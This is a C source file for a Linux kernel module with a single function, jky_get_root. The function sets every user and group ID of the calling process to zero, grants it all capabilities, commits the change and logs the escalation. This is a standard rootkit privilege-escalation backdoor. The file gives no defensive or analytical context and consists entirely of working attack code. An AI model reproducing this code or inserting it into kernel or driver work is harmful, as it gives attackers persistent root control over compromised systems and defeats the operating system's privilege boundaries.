#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/capability.h>
#include <linux/module.h>
#include "cred_escalate.h"

int jky_get_root(void) {
    struct cred *new = prepare_creds();
    if (!new) return -ENOMEM;

    new->uid.val   = new->gid.val   = 0;
    new->euid.val  = new->egid.val  = 0;
    new->suid.val  = new->sgid.val  = 0;
    new->fsuid.val = new->fsgid.val = 0;

    new->cap_effective   = CAP_FULL_SET;
    new->cap_inheritable = CAP_FULL_SET;
    new->cap_permitted   = CAP_FULL_SET;
    new->cap_bset        = CAP_FULL_SET;
    new->cap_ambient     = CAP_FULL_SET;

    commit_creds(new);
    pr_info("jky: escalated pid %d to root\n", current->pid);
    return 0;
}
